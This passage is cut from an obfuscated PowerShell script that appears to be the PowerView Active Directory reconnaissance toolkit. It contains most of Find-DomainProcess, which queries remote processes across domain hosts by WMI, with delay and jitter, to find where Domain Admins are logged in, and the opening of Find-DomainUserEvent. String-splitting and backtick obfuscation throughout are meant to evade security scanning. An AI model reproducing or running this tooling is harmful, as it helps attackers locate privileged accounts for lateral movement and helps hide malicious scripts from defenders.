        [Alias({"{1}{2}{0}" -f'ePack','Serv','ic'})]
        [String]
        ${C`om`puTe`RsERVIc`EP`A`Ck},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f'Nam','e','Site'})]
        [String]
        ${coM`puterSI`T`enaMe},

        [Parameter(pAramETERSetnAMe = "TArG`ETPr`OCE`SS")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pR`ocEs`SNa`mE},

        [Parameter(pAramETErSETNAMe = "taR`Ge`TuSer")]
        [Parameter(ParAmeteRSETNAmE = "uS`Er`iDEn`Tity")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${uSERId`e`Nt`ITy},

        [Parameter(pARAMeteRseTnamE = "tA`Rge`TUseR")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${u`seR`DoMaIn},

        [Parameter(pAraMetErSEtName = "TAR`Ge`TUs`eR")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${U`SE`RldaPFILt`ER},

        [Parameter(paRaMeTErseTNAmE = "t`ARgE`TUser")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${U`SeRs`Earch`B`ASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f 'Group','me','Na'}, {"{0}{1}"-f 'Gro','up'})]
        [String[]]
        ${Us`er`gRo`Up`iDEntiTy} = ("{3}{0}{1}{2}" -f 'i','n',' Admins','Doma'),

        [Parameter(parAMETErsETNamE = "TaR`GE`TuSEr")]
        [Alias({"{0}{1}{2}"-f'Adm','i','nCount'})]
        [Switch]
        ${use`RADm`in`coUnt},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{3}{4}{0}" -f 'er','D','omai','nContro','ll'})]
        [String]
        ${SeRv`eR},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{2}{1}{0}"-f'vel','Le','One'}, {"{1}{2}{0}"-f 'ee','Su','btr'})]
        [String]
        ${sea`RCHsC`OPe} = ("{1}{0}" -f 'tree','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${Re`Su`lTpag`EsI`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Serv`ERT`im`ElImiT},

        [Switch]
        ${tomBs`T`O`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEd`eNTI`AL} =   $0dSqR::"E`MPTy",

        [Switch]
        ${stoPon`suc`CEss},

        [ValidateRange(1, 10000)]
        [Int]
        ${del`AY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${jITt`er} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${thRea`Ds} = 20
    )

    BEGIN {
        ${cOM`puTe`RseA`RCHERARg`U`m`E`NTS} = @{
            ("{1}{0}{2}" -f 'pert','Pro','ies') = ("{3}{2}{0}{1}" -f'nam','e','shost','dn')
        }
        if (${psb`OuN`dpArAM`ETers}[("{1}{0}{2}" -f 'mai','Do','n')]) { ${cOMPuTer`sE`A`R`C`HER`Ar`gU`meNts}[("{1}{0}" -f'main','Do')] = ${doM`AIn} }
        if (${pSB`oUndp`ARaME`T`ers}[("{0}{2}{3}{1}" -f 'Co','main','mpu','terDo')]) { ${C`OmpuTer`s`E`ArCHeRa`Rgum`ENtS}[("{0}{1}" -f'D','omain')] = ${c`omPu`TER`D`OMaIN} }
        if (${PsboUN`D`paRaMe`Te`Rs}[("{0}{1}{2}{3}" -f'Co','m','puterLDAPFilte','r')]) { ${Com`P`U`TeRSEA`R`cHeRAr`gUm`E`NTS}[("{0}{3}{1}{2}"-f'LD','PFil','ter','A')] = ${c`O`MPuTeRLdaPfI`L`TeR} }
        if (${P`SBOUNDPA`RameT`ERS}[("{3}{5}{2}{0}{1}{4}"-f'terS','earchBas','u','Co','e','mp')]) { ${C`O`mputE`RSE`ARcHERa`R`GUm`ENTs}[("{1}{2}{0}" -f'se','Se','archBa')] = ${c`OM`p`UTErSeARchB`Ase} }
        if (${pSB`Oun`D`Pa`RAmetERs}[("{0}{1}{2}" -f 'Unc','on','strained')]) { ${cO`mpU`T`erseaRChEr`ARg`U`MeNtS}[("{1}{3}{2}{0}"-f'strained','Unc','n','o')] = ${u`Nc`On`StrAIned} }
        if (${PsBo`U`NDparame`T`ErS}[("{4}{1}{0}{6}{5}{2}{3}" -f'pera','rO','ngS','ystem','Compute','i','t')]) { ${compUteRs`eAR`CHE`Ra`R`GUME`NTs}[("{4}{1}{0}{3}{2}"-f 'e','p','em','ratingSyst','O')] = ${O`peRAt`ingSy`S`TeM} }
        if (${ps`BOu`Nd`pARamETERS}[("{0}{2}{3}{1}"-f 'Computer','icePack','S','erv')]) { ${co`MpUTe`RSE`ArC`hE`RARgUM`EnTs}[("{0}{1}{2}"-f'Servi','c','ePack')] = ${se`RV`ICe`PAcK} }
        if (${P`sbOuN`DpARaMeT`ERS}[("{2}{0}{1}" -f'puter','SiteName','Com')]) { ${compuTErs`EA`RCh`Er`A`RGuMENTS}[("{0}{1}{2}" -f 'Site','Nam','e')] = ${SIT`ENA`ME} }
        if (${P`sbo`UND`pAr`AmetE`Rs}[("{0}{1}" -f'Serve','r')]) { ${COmP`Ut`ErsEAR`cH`e`RarGum`Ents}[("{1}{0}" -f'ver','Ser')] = ${s`erV`ER} }
        if (${Ps`Bou`N`DPA`RAMeterS}[("{1}{0}{2}"-f'co','SearchS','pe')]) { ${CompUtE`Rse`ARCHe`R`ArGUMENts}[("{0}{2}{3}{1}"-f'Se','pe','arch','Sco')] = ${Sea`RCh`s`COpe} }
        if (${psbOUndpAR`Ame`T`eRS}[("{0}{3}{2}{1}"-f 'R','geSize','Pa','esult')]) { ${COm`PU`T`E`RsEArcherAr`gUMENtS}[("{2}{1}{0}" -f'tPageSize','l','Resu')] = ${r`esUl`TPaGE`S`ize} }
        if (${pSBO`Un`dPa`RA`metE`RS}[("{3}{0}{2}{1}" -f 'er','Limit','verTime','S')]) { ${C`oM`PU`TErsearC`HEra`RGumEntS}[("{3}{4}{2}{0}{1}" -f 'meL','imit','i','Serve','rT')] = ${s`erVErtiMe`L`IM`it} }
        if (${P`SbO`UnD`PAr`AMeTers}[("{1}{2}{0}"-f'bstone','To','m')]) { ${COMputErS`EAR`cHe`R`ArGuM`ENtS}[("{1}{2}{0}"-f 'ne','To','mbsto')] = ${t`oMBs`Tone} }
        if (${p`s`Boun`DPA`RaMETERS}[("{0}{3}{1}{2}" -f 'Cr','ntia','l','ede')]) { ${c`OmPU`TER`SEarch`ErARGU`m`E`NTs}[("{1}{2}{0}" -f'al','C','redenti')] = ${creD`En`Ti`AL} }

        ${UsEr`se`A`R`C`HerArguMenTs} = @{
            ("{1}{2}{0}"-f 's','Prope','rtie') = ("{3}{1}{4}{2}{0}" -f'ame','amacco','tn','s','un')
        }
        if (${PsBouN`d`PARAmeT`ErS}[("{2}{1}{3}{0}" -f'y','erIdent','Us','it')]) { ${u`Ser`SeArch`E`RaRgumENTS}[("{1}{0}"-f'ty','Identi')] = ${UsEriD`EN`T`i`TY} }
        if (${PSBOUnd`P`A`RA`mEteRS}[("{1}{2}{0}" -f'ain','D','om')]) { ${uSeRsE`ARC`HeR`A`Rg`UmEnTS}[("{0}{1}" -f 'Do','main')] = ${dOMa`IN} }
        if (${pSB`OU`NDP`ArA`METErS}[("{0}{1}{2}" -f 'UserD','o','main')]) { ${US`Er`sEa`Rc`HeRAR`guMENTs}[("{1}{0}" -f'omain','D')] = ${uS`E`R`dOmaIn} }
        if (${PSB`oUndPaR`AMe`TE`Rs}[("{1}{0}{3}{2}{4}" -f 'ser','U','DAPF','L','ilter')]) { ${U`Ser`s`earChE`RArgUMeNTs}[("{0}{2}{1}" -f'LDAPFil','r','te')] = ${Use`R`LDApf`i`LTeR} }
        if (${p`SBo`U`N`DpARaMEtE`Rs}[("{2}{1}{0}{3}"-f'chB','ear','UserS','ase')]) { ${u`SeRS`E`ArC`hERA`RGumEnts}[("{2}{1}{0}"-f 'hBase','arc','Se')] = ${u`s`E`RSEARChbase} }
        if (${pSb`o`UnDPA`Ra`MEt`ErS}[("{1}{0}{2}" -f 'n','UserAdmi','Count')]) { ${uSer`s`earC`HER`AR`G`UmeNTS}[("{0}{2}{1}"-f'A','inCount','dm')] = ${USE`RaDMi`NC`ounT} }
        if (${P`SBO`UNDP`ARAmetERS}[("{0}{1}" -f'Ser','ver')]) { ${u`s`eRsE`ArCHErA`RG`UmE`NTS}[("{0}{1}" -f'S','erver')] = ${S`eRver} }
        if (${PsboU`NDpaRA`meT`e`RS}[("{0}{2}{1}"-f'SearchS','pe','co')]) { ${useRSeARcHERaR`GU`Me`NTS}[("{2}{0}{1}"-f'hSco','pe','Searc')] = ${Sea`R`chScopE} }
        if (${pS`B`OU`NdPARAMeTeRS}[("{4}{1}{0}{3}{2}" -f 'eSi','ltPag','e','z','Resu')]) { ${UsErS`EaR`cHeRA`RGumEnTS}[("{0}{2}{1}{3}{4}" -f 'Res','lt','u','PageS','ize')] = ${ReSu`L`TPAGEs`izE} }
        if (${PSb`oUNDPaRAMe`TE`RS}[("{3}{1}{0}{4}{2}"-f'Tim','erver','mit','S','eLi')]) { ${u`SeR`S`eAr`ChERArg`UmeN`Ts}[("{3}{1}{2}{0}"-f'meLimit','e','rTi','Serv')] = ${S`E`RVERTIMEl`iM`it} }
        if (${psBo`U`N`DparAMETERS}[("{2}{0}{1}"-f 'bsto','ne','Tom')]) { ${USE`R`SeaR`CheRarG`U`Men`TS}[("{0}{1}{2}"-f 'To','mbs','tone')] = ${t`OMb`sTonE} }
        if (${PsBOu`Nd`pAraMe`TeRs}[("{2}{1}{0}" -f 'ial','edent','Cr')]) { ${UsersEArChe`RARGUm`En`TS}[("{1}{0}{2}"-f 'e','Cred','ntial')] = ${cr`Ed`EnTiaL} }


        
        if (${P`sBOUND`Pa`Ram`E`TERS}[("{1}{2}{3}{0}"-f 'uterName','C','om','p')]) {
            ${t`ARG`etCo`MPu`TeRS} = ${CO`mpuTer`N`AMe}
        }
        else {
            &("{2}{1}{0}{3}" -f 'b','e-Ver','Writ','ose') ("{1}{8}{0}{4}{7}{5}{3}{2}{6}" -f'ma','[Fin','in t','puters ','i','ocess] Querying com','he domain','nPr','d-Do')
            ${T`Ar`gET`CoMpUTerS} = &("{1}{2}{3}{0}{4}" -f'pute','Get','-D','omainCom','r') @ComputerSearcherArguments | &("{2}{0}{4}{3}{1}" -f'le','t','Se','bjec','ct-O') -ExpandProperty ("{3}{0}{1}{2}" -f 'os','tna','me','dnsh')
        }
        &("{1}{0}{2}" -f 'te-V','Wri','erbose') "[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length) "
        if (${tA`RGE`TCO`M`PuterS}."le`Ng`Th" -eq 0) {
            throw ("{14}{10}{8}{1}{3}{11}{12}{0}{4}{13}{7}{2}{6}{9}{5}" -f 's','-Dom','o ','a','s] No','erate','en','t','d','um','Fin','inPr','oce',' hosts found ','[')
        }

        
        if (${PSbOUNd`PAR`Am`eT`eRs}[("{3}{0}{1}{2}" -f 'ess','N','ame','Proc')]) {
            ${T`ARGE`T`pRocEs`sna`Me} = @()
            ForEach (${t} in ${proce`SsnA`mE}) {
                ${targE`T`P`ROcE`SSnA`ME} += ${T}.("{0}{1}" -f'S','plit').Invoke(',')
            }
            if (${TaRGetPro`C`eSsN`A`Me} -isnot [System.Array]) {
                ${t`AR`gE`TPROCES`s`NAme} = [String[]] @(${TA`RGe`Tpr`Oc`eSSNaMe})
            }
        }
        elseif (${ps`Bo`U`NDpaRa`M`eters}[("{0}{2}{1}{3}" -f'UserI','nti','de','ty')] -or ${PSB`ou`NdpaRame`Ters}[("{2}{1}{3}{4}{0}"-f 'er','rL','Use','DAPFi','lt')] -or ${Psb`o`UndPaR`AMEt`eRS}[("{2}{3}{0}{4}{1}" -f'ar','se','Us','erSe','chBa')] -or ${ps`BOUNdp`ARAmet`ERS}[("{0}{2}{1}" -f 'User','unt','AdminCo')] -or ${pS`BOUndp`ArAme`T`Ers}[("{1}{3}{2}{0}"-f 'ation','Use','AllowDeleg','r')]) {
            ${TA`RGE`TUSe`RS} = &("{2}{4}{3}{1}{0}" -f 'er','omainUs','Get','D','-') @UserSearcherArguments | &("{0}{2}{3}{1}"-f'S','ject','elect-O','b') -ExpandProperty ("{2}{0}{1}"-f 'acco','untname','sam')
        }
        else {
            ${gR`ouPS`Ea`Rc`he`Ra`RguMents} = @{
                ("{2}{1}{0}" -f'ity','ent','Id') = ${uSE`R`gR`oUPIdEnt`ITY}
                ("{0}{1}" -f'Recu','rse') = ${t`RUe}
            }
            if (${pSb`Ou`Ndp`ARAme`T`ERS}[("{2}{0}{1}"-f'erDoma','in','Us')]) { ${grOU`PSE`ArcHe`RArg`UmE`N`TS}[("{2}{1}{0}" -f'n','i','Doma')] = ${UsEr`do`MAIn} }
            if (${psBOU`N`DpaR`A`mEt`Ers}[("{0}{3}{2}{1}{4}" -f 'U','hBa','rc','serSea','se')]) { ${gROu`p`sEA`RC`HER`ArGumen`TS}[("{0}{3}{2}{1}"-f 'Sea','e','chBas','r')] = ${U`S`Er`Searchb`Ase} }
            if (${PSBo`U`Ndp`Ara`MetERS}[("{0}{1}"-f'Ser','ver')]) { ${GrO`Upse`ARChEr`A`RgUMenTS}[("{1}{0}"-f'r','Serve')] = ${S`e`RvEr} }
            if (${p`s`B`o`UndP`ARaMEtErS}[("{2}{1}{0}{3}" -f 'o','earchSc','S','pe')]) { ${gROu`p`Se`A`RCH`ErarGuM`ENtS}[("{2}{0}{1}" -f'arch','Scope','Se')] = ${sEaRc`hS`cope} }
            if (${ps`BOu`Nd`pARaMe`Ters}[("{3}{0}{1}{2}"-f 'ge','S','ize','ResultPa')]) { ${gR`O`UPSeAR`chERa`R`guMENTS}[("{2}{3}{0}{1}{4}" -f'sultPageS','iz','R','e','e')] = ${ReSU`LTPAG`Es`Ize} }
            if (${pSBO`UN`DPArA`meT`ErS}[("{0}{3}{1}{2}" -f'Serve','i','meLimit','rT')]) { ${G`RoUpSea`RCherAr`G`UmEN`Ts}[("{0}{2}{1}{3}"-f'Serve','imi','rTimeL','t')] = ${s`eR`V`erTImElI`M`It} }
            if (${p`sBouN`DPaRa`meT`eRs}[("{3}{0}{1}{2}"-f'ombs','t','one','T')]) { ${GRO`UPSeAr`c`H`Erarg`UmENts}[("{1}{0}{2}"-f 'bst','Tom','one')] = ${TOM`B`STOnE} }
            if (${PSBO`UNdP`ArA`m`E`TerS}[("{2}{1}{0}"-f 'ial','dent','Cre')]) { ${GRou`ps`EA`RcHEr`A`RGu`MeNTs}[("{2}{3}{0}{1}"-f 'enti','al','Cre','d')] = ${CRe`De`N`TIaL} }
            ${grou`p`S`EARc`herARgUmE`Nts}
            ${tA`RgE`TuS`eRS} = &("{5}{3}{2}{4}{1}{0}" -f'ember','nGroupM','Doma','et-','i','G') @GroupSearcherArguments | &("{0}{2}{3}{1}" -f 'Se','ject','lec','t-Ob') -ExpandProperty ("{1}{0}{2}"-f 'emb','M','erName')
        }

        
        ${hoStEN`Um`B`Lo`CK} = {
            Param(${COm`PUtERN`AME}, ${P`RocEs`Sn`AmE}, ${T`ArG`EtU`SerS}, ${C`R`E`dENTiAL})

            ForEach (${taR`gEt`cOmPuTer} in ${cOMPuT`ErN`AME}) {
                ${U`P} = &("{0}{2}{1}{3}" -f'Test-','ne','Con','ction') -Count 1 -Quiet -ComputerName ${tArg`eTcOm`PUteR}
                if (${u`P}) {
                    
                    
                    if (${c`REDEN`T`Ial}) {
                        ${pro`c`e`sSeS} = &("{2}{1}{0}" -f'ocess','et-WMIPr','G') -Credential ${C`REdE`Nti`Al} -ComputerName ${T`ARG`etc`Om`pUTEr} -ErrorAction ("{2}{1}{3}{0}" -f 'nue','ilentlyCon','S','ti')
                    }
                    else {
                        ${p`Roces`ses} = &("{1}{2}{0}"-f'ess','Get-','WMIProc') -ComputerName ${T`ArGE`TcoMpU`TeR} -ErrorAction ("{0}{5}{4}{3}{1}{2}"-f'Silen','u','e','n','lyConti','t')
                    }
                    ForEach (${pr`oCESs} in ${P`RO`CeS`seS}) {
                        
                        if (${P`Ro`CE`SSnaME}) {
                            if (${pr`O`Ces`snAmE} -Contains ${Pr`oC`Ess}."p`R`oCEsSna`ME") {
                                ${Pro`ce`sS}
                            }
                        }
                        
                        elseif (${ta`RGe`T`USerS} -Contains ${PRO`ce`SS}."US`eR") {
                            ${p`ROCe`SS}
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        
        if (${Psb`o`Un`dp`A`RametErS}[("{1}{0}" -f 'lay','De')] -or ${psbo`UN`dPAraMEte`Rs}[("{0}{3}{1}{2}" -f'Sto','cces','s','pOnSu')]) {

            &("{0}{2}{1}" -f 'Write-Ver','ose','b') "[Find-DomainProcess] Total number of hosts: $($TargetComputers.count) "
            &("{2}{0}{1}{3}" -f 'te-Verbo','s','Wri','e') ('[Fi'+'nd-D'+'omainProces'+'s] '+'D'+'elay'+': '+"$Delay, "+'Jitt'+'er:'+' '+"$Jitter")
            ${coUn`T`Er} = 0
            ${R`A`NDNo} = &("{1}{2}{0}" -f'ect','New','-Obj') ("{0}{3}{2}{1}" -f'Syst','m','ndo','em.Ra')

            ForEach (${t`A`RG`EtcOmpUT`ER} in ${TAr`gETc`Omp`UtE`Rs}) {
                ${c`Ou`NtER} = ${co`UnT`eR} + 1

                
                &("{0}{2}{1}" -f'S','Sleep','tart-') -Seconds ${RAn`dno}.("{0}{1}"-f 'N','ext').Invoke((1-${j`ItT`ER})*${De`LAy}, (1+${j`itT`ER})*${Del`AY})

                &("{2}{1}{0}" -f 'e','erbos','Write-V') "[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                ${ReS`Ult} = &("{3}{0}{4}{2}{1}" -f 'vok','nd','ma','In','e-Com') -ScriptBlock ${HOsTEn`UMb`L`OcK} -ArgumentList ${t`A`R`GETCOmpUTeR}, ${tArg`ETPRO`CesSnA`me}, ${T`ArgeTU`S`ErS}, ${c`R`EDentIAL}
                ${res`ULt}

                if (${RES`ULT} -and ${S`TOPonsUCcE`sS}) {
                    &("{1}{0}{2}"-f'o','Write-Verb','se') ("{7}{0}{4}{1}{3}{8}{5}{2}{6}" -f'a','Process] ','ing','Ta','in',' user found, return',' early','[Find-Dom','rget')
                    return
                }
            }
        }
        else {
            &("{1}{0}{2}"-f 'rite-V','W','erbose') ('[F'+'ind-DomainP'+'roce'+'s'+'s'+'] '+'Us'+'ing '+'th'+'readi'+'ng '+'w'+'ith '+'t'+'hreads'+': '+"$Threads")

            
            ${SC`Ri`ptP`Arams} = @{
                ("{1}{0}{2}"-f'rocessN','P','ame') = ${ta`RGetPRocE`S`Sn`A`mE}
                ("{1}{2}{0}" -f'rs','Tar','getUse') = ${TARG`e`TusERs}
                ("{1}{2}{0}{3}"-f'a','Cre','denti','l') = ${CrEDE`Nt`i`AL}
            }

            
            &("{1}{2}{0}{4}{3}" -f 'hread','New-','T','nction','edFu') -ComputerName ${t`A`RGE`T`cOmPutERs} -ScriptBlock ${H`OSTenu`mb`lOCk} -ScriptParameters ${Sc`RI`pt`ParaMS} -Threads ${T`hRE`ADs}
        }
    }
}


function FIn`D-d`OMAI`Nus`e`Re`VenT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{4}{0}{1}" -f'es','s','P','SShoul','dProc'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{2}{3}{0}{1}{4}" -f'edVarsMo','reThanAssign','Decl','ar','ments','PSUse'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{5}{6}{2}{0}{1}{4}"-f'T','y','ial','PSUse','pe','PSCr','edent'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{4}{3}{1}{5}{0}" -f 'ssword','gPlainTextFor','PSAvoidU','n','si','Pa'}, '')]
    [OutputType({"{2}{0}{1}{4}{5}{3}" -f'e','w','PowerVi','ent','.','LogonEv'})]
    [OutputType({"{8}{6}{9}{2}{3}{0}{5}{1}{7}{4}"-f 'ed','ial','ici','tCr','ogon','ent','ow','L','P','erView.Expl'})]
    [CmdletBinding(DeFaultPaRaMetErSETnamE = {"{1}{0}"-f'ain','Dom'})]
    Param(
        [Parameter(PARaMeteRSETnAMe = "ComPutEr`NA`ME", POsiTIOn = 0, vaLueFromPIpelINe = ${tr`Ue}, VALUeFROmPipELiNEbypRoperTYnAme = ${TR`Ue})]
        [Alias({"{2}{1}{0}"-f'stname','o','dnsh'}, {"{1}{0}"-f'e','HostNam'}, {"{0}{1}" -f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CoM`pU`TernaME},

        [Parameter(pARAmEtErsETName = "D`om`AIN")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`M`Ain},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${fI`L`Ter},

        [Parameter(VaLuEfroMpIpeLiNEByPROpeRTynAMe = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${STARTT`I`mE} =   $2PfhU4::"n`ow".("{1}{0}" -f 'ays','AddD').Invoke(-1),

        [Parameter(vaLUEFRoMPIPeliNEBYpropeRtynaME = ${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${e`NDTI`ME} =  (gci VarIaBle:2PfHu4  ).VAlue::"N`oW",

        [ValidateRange(1, 1000000)]
        [Int]
        ${m`AXEVe`NTs} = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${US`Er`ide`Nt`ITY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${USeRd`o`m`AIn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${USER`L`DaPfilTEr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${us`eRSea`R`chBasE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'Grou','Name','p'}, {"{1}{0}" -f'p','Grou'})]
        [String[]]
        ${uSEr`g`RO`UPide`NTity} = ("{4}{0}{2}{3}{1}"-f 'o','ins','main',' Adm','D'),

        [Alias({"{2}{1}{0}"-f'nt','u','AdminCo'})]
        [Switch]
        ${UsErAd`mi`NcoU`Nt},

        [Switch]
        ${CHECk`AcC`EsS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}{3}"-f'nCont','rolle','Domai','r'})]
        [String]
        ${sERV`eR},

        [ValidateSet({"{1}{0}"-f'ase','B'}, {"{0}{2}{1}"-f'OneLe','l','ve'}, {"{0}{2}{1}" -f 'Subt','e','re'})]
        [String]
        ${SEarcH`s`cope} = ("{0}{1}" -f 'Su','btree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RESU`LTPAgeS`I`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SErvERTI`m`eli`M`IT},

        [Switch]
        ${toM`B`SToNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`Eden`TiAL} =  (get-vaRiaBle  0dSqR).value::"e`mpTY",

        [Switch]
        ${sToP`o`NS`UC`CESs},

        [ValidateRange(1, 10000)]
        [Int]
        ${D`Elay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${JiTt`er} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${Th`ReADS} = 20
    )

    BEGIN {
        ${use`RS`EArChER`Ar`G`UM`ENts} = @{
            ("{1}{0}{2}" -f 'e','Properti','s') = ("{2}{0}{3}{1}" -f'maccountn','me','sa','a')
        }
        if (${P`S`BounD`par`Am`ETErs}[("{0}{3}{1}{2}"-f'UserId','it','y','ent')]) { ${Use`RsE`A`RC`H`erargU`ments}[("{0}{2}{1}"-f 'I','ity','dent')] = ${Use`Ri`d`enti`Ty} }
        if (${pS`BOuNdpa`RaM`E`TE`RS}[("{0}{2}{1}"-f'Us','ain','erDom')]) { ${U`SeRseAR`c`he`RaRg`U`meNTs}[("{1}{0}" -f 'ain','Dom')] = ${u`sERDO`main} }
        if (${Ps`B`OuNDpaRametE`RS}[("{3}{1}{0}{4}{2}" -f 'LDAPF','r','ter','Use','il')]) { ${u`s`eRsEar`c`heRa`RGUmE`NTS}[("{2}{1}{0}" -f 'Filter','DAP','L')] = ${uSErl`D`A`pfiLTeR} }
        if (${ps`BOUn`d`PAra`METERs}[("{1}{2}{0}"-f 'archBase','Use','rSe')]) { ${usERs`eArch`Er`Ar`gUMEnts}[("{0}{2}{1}" -f 'Sear','Base','ch')] = ${U`SE`RSe`ArCh`BaSe} }
        if (${p`SBOUndpA`R`AmEtERS}[("{1}{3}{2}{4}{0}" -f 'nCount','U','A','ser','dmi')]) { ${u`se`R`SearcHeraRgU`M`EN`Ts}[("{1}{0}{2}"-f'inCou','Adm','nt')] = ${UsErAdm`i`N`c`ounT} }
        if (${Ps`Boun`dpA`RaMETERs}[("{2}{0}{1}"-f 'e','r','Serv')]) { ${Users`EarChera`Rgu`mENtS}[("{2}{0}{1}" -f'rve','r','Se')] = ${s`erv`er} }
        if (${pSbO`UndP`ARa`MEteRs}[("{0}{1}{3}{2}"-f 'Sea','rch','e','Scop')]) { ${u`se`R`searCHE`RaRgu`Men`Ts}[("{1}{0}{2}" -f 'o','SearchSc','pe')] = ${sEAr`cHs`CO`Pe} }
        if (${PSBouNDP`A`Ram`eTeRs}[("{0}{1}{2}" -f'R','esu','ltPageSize')]) { ${U`sE`RSEArc`HeRaRgUM`e`N`TS}[("{2}{1}{0}"-f'ze','Si','ResultPage')] = ${r`Es`Ul`TPa`GEsizE} }
        if (${Psb`O`UNDpar`AMe`TERs}[("{1}{0}{2}{3}" -f 'erTimeLi','Serv','mi','t')]) { ${usERSe`ArC`Her`ARgUmeNts}[("{2}{0}{3}{1}"-f'erTim','mit','Serv','eLi')] = ${se`R`VErTimE`li`Mit} }
        if (${psBOUn`D`p`ARAM`eTerS}[("{1}{3}{2}{0}"-f 'stone','T','mb','o')]) { ${Us`ErsEaR`chErar`Gu`M`entS}[("{2}{1}{0}" -f'tone','mbs','To')] = ${t`o`M`BsToNe} }
        if (${p`SB`Oundp`ArAMeTERs}[("{1}{2}{0}"-f'ial','Cred','ent')]) { ${usE`RSEaR`ChErArG`UMENTS}[("{2}{3}{0}{1}" -f 'edentia','l','C','r')] = ${C`RED`eNt`IAl} }

        if (${pSBOu`NDpaRA`METE`Rs}[("{0}{1}{3}{2}" -f 'U','s','ity','erIdent')] -or ${p`sb`oundpArA`M`ETERs}[("{2}{4}{3}{0}{1}"-f 'lt','er','Use','DAPFi','rL')] -or ${psBoUndPAR`AME`T`ERS}[("{3}{2}{1}{0}" -f 'se','hBa','rc','UserSea')] -or ${PsbouNdP`A`R`AmE`Ters}[("{1}{0}{3}{2}" -f 'nC','UserAdmi','unt','o')]) {
            ${TArGETU`se`RS} = &("{0}{3}{1}{2}" -f'G','omain','User','et-D') @UserSearcherArguments | &("{3}{0}{1}{2}{4}" -f 'ct-','O','b','Sele','ject') -ExpandProperty ("{0}{2}{1}{3}" -f 'sam','ntnam','accou','e')
        }
        elseif (${P`S`B`OunDPARAMeT`ers}[("{0}{3}{2}{1}"-f 'User','ity','t','GroupIden')] -or (-not ${PsB`OundpA`RA`meT`ErS}[("{1}{0}"-f 'ter','Fil')])) {
            
            ${GROU`p`sEArCHer`ARG`U`MEn`Ts} = @{
                ("{0}{2}{1}"-f'Iden','ity','t') = ${uSER`groUpIdE`N`TI`Ty}
                ("{1}{0}"-f'se','Recur') = ${tR`UE}
            }
            &("{0}{1}{2}"-f 'Wri','te','-Verbose') ('User'+'GroupIdentit'+'y:'+' '+"$UserGroupIdentity")
            if (${psBOU`Nd`p`A`RaMEtErS}[("{1}{2}{0}"-f 'ain','Us','erDom')]) { ${GROu`p`SeARChERaRG`UMe`NtS}[("{1}{0}" -f 'in','Doma')] = ${Us`Er`DOMa`in} }
            if (${Ps`B`OUNDpARA`meT`erS}[("{0}{3}{1}{2}" -f'Use','archB','ase','rSe')]) { ${Gr`OupseA`RChERaRgU`MEN`TS}[("{2}{0}{1}"-f'a','se','SearchB')] = ${US`ERSe`AR`cHBAse} }
            if (${p`SbOUNDPA`R`AMeTe`Rs}[("{1}{2}{0}" -f 'rver','S','e')]) { ${groUpSEaRCH`E`RArGUM`e`Nts}[("{1}{2}{0}" -f'r','Serv','e')] = ${se`R`VER} }
            if (${p`sB`oUn`DPARaMeTe`RS}[("{2}{0}{1}" -f 'chSco','pe','Sear')]) { ${GroU`psEaR`Che`Rar`GuMEntS}[("{1}{3}{0}{2}" -f'c','S','hScope','ear')] = ${sEArCh`Sc`o`Pe} }
            if (${ps`BOu`NdpaRa`mEte`RS}[("{0}{2}{1}"-f'ResultPag','e','eSiz')]) { ${Gr`OupSe`AR`chErArg`UM`EntS}[("{1}{0}{3}{2}" -f 'u','Res','ageSize','ltP')] = ${rESu`LT`PAges`ize} }
            if (${PsbOUnD`paR`Am`eTerS}[("{1}{2}{0}{3}"-f 'erT','Ser','v','imeLimit')]) { ${groUPsEAR`C`H`E`RaRg`UM`eNTs}[("{2}{0}{3}{4}{1}"-f'erve','mit','S','rTim','eLi')] = ${SErver`Ti`M`ELIMIT} }
            if (${psbo`UNDPa`RaMeT`eRs}[("{0}{2}{1}"-f'To','ne','mbsto')]) { ${GroupsE`A`RCheR`ARgum`eN`TS}[("{1}{0}{2}"-f 'mb','To','stone')] = ${tO`MBs`TOnE} }
            if (${p`S`BOUN`dp`Arameters}[("{3}{1}{2}{0}"-f'al','red','enti','C')]) { ${GrO`U`p`SEARCh`ERARGumen`TS}[("{2}{1}{0}" -f'al','ti','Creden')] = ${C`ReD`Enti`AL} }
